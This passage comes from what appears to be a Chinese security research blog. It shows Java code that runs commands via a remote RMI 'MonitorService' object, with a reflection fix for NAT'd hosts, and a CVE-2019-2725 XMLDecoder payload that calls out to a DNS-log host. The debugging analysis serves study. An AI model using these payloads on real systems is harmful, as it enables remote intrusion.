class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> MBeanInfo <span class="hljs-title function_">getMBeanInfo</span><span class="hljs-params">(ObjectName name, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> InstanceNotFoundException, IntrospectionException, ReflectionException, IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isInstanceOf</span><span class="hljs-params">(ObjectName name, String className, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> InstanceNotFoundException, IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addNotificationListener</span><span class="hljs-params">(ObjectName name, ObjectName listener, MarshalledObject filter, MarshalledObject handback, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> InstanceNotFoundException, IOException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeNotificationListener</span><span class="hljs-params">(ObjectName name, ObjectName listener, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> InstanceNotFoundException, ListenerNotFoundException, IOException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeNotificationListener</span><span class="hljs-params">(ObjectName name, ObjectName listener, MarshalledObject filter, MarshalledObject handback, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> InstanceNotFoundException, ListenerNotFoundException, IOException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Integer[] addNotificationListeners(ObjectName[] names, MarshalledObject[] filters, Subject[] delegationSubjects) <span class="hljs-keyword">throws</span> InstanceNotFoundException, IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeNotificationListeners</span><span class="hljs-params">(ObjectName name, Integer[] listenerIDs, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> InstanceNotFoundException, ListenerNotFoundException, IOException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> NotificationResult <span class="hljs-title function_">fetchNotifications</span><span class="hljs-params">(<span class="hljs-type">long</span> clientSequenceNumber, <span class="hljs-type">int</span> maxNotifications, <span class="hljs-type">long</span> timeout)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后远程调用这个实例的<code>getDefaultDomain</code>方法，获取命令执行结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.security.auth.UnixPrincipal;<br><br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnection;<br><span class="hljs-keyword">import</span> javax.security.auth.Subject;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;id&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;ip&quot;</span>,port);<br><br><br>        <span class="hljs-type">Subject</span> <span class="hljs-variable">subject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Subject</span>();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> subject.getClass().getDeclaredField(<span class="hljs-string">&quot;principals&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Set</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>        <span class="hljs-type">UnixPrincipal</span> <span class="hljs-variable">unixPrincipal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnixPrincipal</span>(command);<br>        set.add(unixPrincipal);<br>        f.set(subject, set);<br><br>        System.out.println(((RMIConnection)registry.lookup(<span class="hljs-string">&quot;MonitorService&quot;</span>)).getDefaultDomain(subject));<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是这样可能会遇到一个问题，通过抓包可知，调用 lookup 方法时，客户端与服务端会进行两次连接，第一次服务端会回复一个 ReturnData 消息，里面包含下次连接时的 ip 和端口，ip 还是服务端的 ip，但是这个 ip 有可能返回的是服务端的内网 ip ，那么通过外网对这个 ip 连接肯定会失败</p><p>在<code>sun.rmi.transport.ConnectionInputStream#saveRef</code>方法中下断点，可以看到这里在存储第一次连接后获取到的 ip 和端口</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1695461989737-1e219ee7-9dad-44d6-b0e8-2859879f1746.png" alt="image.png"></p><p>而<code>ConnectionInputStream#saveRef</code>方法是在<code>sun.rmi.registry.RegistryImpl_Stub#lookup</code>方法中一步步调用到的</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1695462112100-f567a4ce-6141-461f-bd8d-7a3d42b17a70.png" alt="image.png"></p><p>调用栈如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">saveRef</span>:<span class="hljs-number">77</span>, ConnectionInputStream (sun.rmi.transport)<br><span class="hljs-attribute">read</span>:<span class="hljs-number">305</span>, LiveRef (sun.rmi.transport)<br><span class="hljs-attribute">readExternal</span>:<span class="hljs-number">493</span>, UnicastRef (sun.rmi.server)<br><span class="hljs-attribute">readObject</span>:<span class="hljs-number">455</span>, RemoteObject (java.rmi.server)<br><span class="hljs-attribute">invoke0</span>:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-attribute">invoke</span>:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-attribute">invoke</span>:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br><span class="hljs-attribute">invoke</span>:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br><span class="hljs-attribute">invokeReadObject</span>:<span class="hljs-number">1185</span>, ObjectStreamClass (java.io)<br><span class="hljs-attribute">readSerialData</span>:<span class="hljs-number">2345</span>, ObjectInputStream (java.io)<br><span class="hljs-attribute">readOrdinaryObject</span>:<span class="hljs-number">2236</span>, ObjectInputStream (java.io)<br><span class="hljs-attribute">readObject0</span>:<span class="hljs-number">1692</span>, ObjectInputStream (java.io)<span class="hljs-meta"> [2]</span><br><span class="hljs-attribute">defaultReadFields</span>:<span class="hljs-number">2454</span>, ObjectInputStream (java.io)<br><span class="hljs-attribute">readSerialData</span>:<span class="hljs-number">2378</span>, ObjectInputStream (java.io)<br><span class="hljs-attribute">readOrdinaryObject</span>:<span class="hljs-number">2236</span>, ObjectInputStream (java.io)<br><span class="hljs-attribute">readObject0</span>:<span class="hljs-number">1692</span>, ObjectInputStream (java.io)<span class="hljs-meta"> [1]</span><br><span class="hljs-attribute">readObject</span>:<span class="hljs-number">508</span>, ObjectInputStream (java.io)<br><span class="hljs-attribute">readObject</span>:<span class="hljs-number">466</span>, ObjectInputStream (java.io)<br><span class="hljs-attribute">lookup</span>:<span class="hljs-number">127</span>, RegistryImpl_Stub (sun.rmi.registry)<br><span class="hljs-attribute">main</span>:<span class="hljs-number">14</span>, RMIClient<br></code></pre></td></tr></table></figure><p>然后继续执行，在<code>RegistryImpl_Stub#lookup</code>方法中</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1695462398774-3d1db4c1-21f7-4bfb-897c-4427d032c43f.png" alt="image.png"></p><p>先调用到<code>sun.rmi.transport.ConnectionInputStream#registerRefs</code>方法，获取刚才 put 的 ip 和端口</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1695462751859-89b375a9-3827-4086-b76d-2bec941d1cdb.png" alt="image.png"></p><p>然后在<code>sun.rmi.transport.DGCClient.EndpointEntry#EndpointEntry</code>方法中将其包装成 UnicastRef 实例</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1695462627907-b5a0c7c7-a724-4294-b997-3ee2a1055ba1.png" alt="image.png"></p><p>将其赋值给<code>java.rmi.server.RemoteObject#ref</code></p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1695462802425-ca3c7ffc-49b7-4595-a438-971a210ec69d.png" alt="image.png"></p><p>调用栈如下</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">&lt;init&gt;:65, RemoteObject (java.rmi.server)</span><br><span class="hljs-section">&lt;init&gt;:63, RemoteStub (java.rmi.server)</span><br><span class="hljs-section">&lt;init&gt;:67, DGCImpl_Stub (sun.rmi.transport)</span><br><span class="hljs-section">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="hljs-section">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="hljs-section">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="hljs-section">newInstance:423, Constructor (java.lang.reflect)</span><br><span class="hljs-section">createStub:294, Util (sun.rmi.server)</span><br><span class="hljs-section">createProxy:142, Util (sun.rmi.server)</span><br><span class="hljs-section">&lt;init&gt;:262, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="hljs-section">lookup:241, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="hljs-section">registerRefs:159, DGCClient (sun.rmi.transport)</span><br><span class="hljs-section">registerRefs:102, ConnectionInputStream (sun.rmi.transport)</span><br><span class="hljs-section">releaseInputStream:175, StreamRemoteCall (sun.rmi.transport)</span><br><span class="hljs-section">done:340, StreamRemoteCall (sun.rmi.transport)</span><br><span class="hljs-section">done:451, UnicastRef (sun.rmi.server)</span><br><span class="hljs-section">lookup:132, RegistryImpl_Stub (sun.rmi.registry)</span><br><span class="hljs-section">main:14, RMIClient</span><br></code></pre></td></tr></table></figure><p>然后再向获取到的 IP 和端口发起连接，远程调用方法，所以这里重新实现 lookup 方法，通过反射的方式修改 host 的值为外网 ip</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.security.auth.UnixPrincipal;<br><span class="hljs-keyword">import</span> sun.rmi.transport.StreamRemoteCall;<br><span class="hljs-keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;<br><br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnection;<br><span class="hljs-keyword">import</span> javax.security.auth.Subject;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInput;<br><span class="hljs-keyword">import</span> java.io.ObjectOutput;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.rmi.*;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.rmi.server.Operation;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteObject;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteRef;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RemoteObject</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Operation[] operations = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;java.lang.String list()[]&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">RemoteRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">public</span> Remote <span class="hljs-title function_">lookup</span><span class="hljs-params">(String var1)</span> <span class="hljs-keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">StreamRemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> (StreamRemoteCall)<span class="hljs-built_in">this</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>                var3.writeObject(var1);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var15) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var15);<br>            &#125;<br><br>            <span class="hljs-built_in">this</span>.ref.invoke(var2);<br><br>            Remote var20;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                var20 = (Remote)var4.readObject();<br><br>                <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> var2.getClass().getDeclaredField(<span class="hljs-string">&quot;in&quot;</span>);<br>                f.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> f.get(var2);<br><br>                f = conn.getClass().getDeclaredField(<span class="hljs-string">&quot;incomingRefTable&quot;</span>);<br>                f.setAccessible(<span class="hljs-literal">true</span>);<br><br>                <span class="hljs-type">HashMap</span> <span class="hljs-variable">rets</span> <span class="hljs-operator">=</span> (HashMap) f.get(conn);<br><br>                Map.Entry&lt;TCPEndpoint, ArrayList&gt; entry = (Map.Entry&lt;TCPEndpoint, ArrayList&gt;) rets.entrySet().iterator().next();<br><br>                f = entry.getKey().getClass().getDeclaredField(<span class="hljs-string">&quot;host&quot;</span>);<br>                f.setAccessible(<span class="hljs-literal">true</span>);<br>                f.set(entry.getKey(), <span class="hljs-built_in">this</span>.ip);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException | ClassCastException var13) &#123;<br><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var13);<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-built_in">this</span>.ref.done(var2);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> var20;<br>        &#125; <span class="hljs-keyword">catch</span> (RuntimeException var16) &#123;<br>            <span class="hljs-keyword">throw</span> var16;<br>        &#125; <span class="hljs-keyword">catch</span> (RemoteException var17) &#123;<br>            <span class="hljs-keyword">throw</span> var17;<br>        &#125; <span class="hljs-keyword">catch</span> (NotBoundException var18) &#123;<br>            <span class="hljs-keyword">throw</span> var18;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var19) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var19);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;id&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ip&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(ip, <span class="hljs-number">1099</span>);<br><br><br>        <span class="hljs-type">Subject</span> <span class="hljs-variable">subject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Subject</span>();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> subject.getClass().getDeclaredField(<span class="hljs-string">&quot;principals&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Set</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>        <span class="hljs-type">UnixPrincipal</span> <span class="hljs-variable">unixPrincipal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnixPrincipal</span>(command);<br>        set.add(unixPrincipal);<br>        f.set(subject, set);<br><br>        f = registry.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;ref&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">RMIClient</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIClient</span>();<br>        r.ref = (RemoteRef) f.get(registry);<br>        r.ip = ip;<br><br>        System.out.println(((RMIConnection)r.lookup(<span class="hljs-string">&quot;MonitorService&quot;</span>)).getDefaultDomain(subject));<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">RMI反序列化</a></li><li><a href="http://www.yulegeyu.com/2021/12/05/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8BJdk7u21-%E5%9B%9E%E6%98%BE/">java反序列之Jdk7u21回显</a></li><li><a href="http://www.yulegeyu.com/2021/12/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8BJdk7u21%E5%9B%9E%E6%98%BE-%E8%A7%A3%E5%86%B3%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/">java反序列之Jdk7u21回显 ~ 解决网络问题</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XMLDecoder 反序列化之 class 标签</title>
    <link href="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/"/>
    <url>/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/</url>
    
    <content type="html"><![CDATA[<p>在学习 CVE-2019-2725 时看到文章中说构造的 xml 需要在一行才能成功</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>java.net.Socket<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>www.dnslog.com<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那么为什么需要这样构造呢，这跟<code>calss</code>标签特性有关，我们先来看下在 class 开始标签与 string 开始标签之间换行会怎样</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>java.net.Socket<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>www.baidu.com<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样使用 XMLDecoder 反序列化时会报错找不到这个类</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/1.png" class=""><p>跟踪调试，在解析 class 标签后，会调用<code>com.sun.beans.decoder.DocumentHandler#characters</code>方法，来添加标签中的字符数据</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/2.png" class=""><p>可以看到这里将换行符和空格添加了进去(因为 xml 换行时编辑器会自动进行缩进，所以带了空格，如果把缩进删除，则只添加换行)</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/3.png" class=""><p>解析 string 闭合标签时，会进入<code>com.sun.beans.decoder.ElementHandler#endElement</code>方法中</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/4.png" class=""><p>append 之后就变成了<code>\n    java.net.Socket</code></p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/5.png" class=""><p>在解析 void 闭合标签时，会进入到<code>com.sun.beans.decoder.ObjectElementHandler#getValueObject</code>方法，跟进<code>getContextBean()</code>方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/6.png" class=""><p>最终会来到<code>com.sun.beans.decoder.ClassElementHandler#getValue</code>方法中，可以很清晰看出为什么会报ClassNotFoundException</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/7.png" class=""><p>那么如果改成如下这样呢？</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>java.net.Socket<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;<span 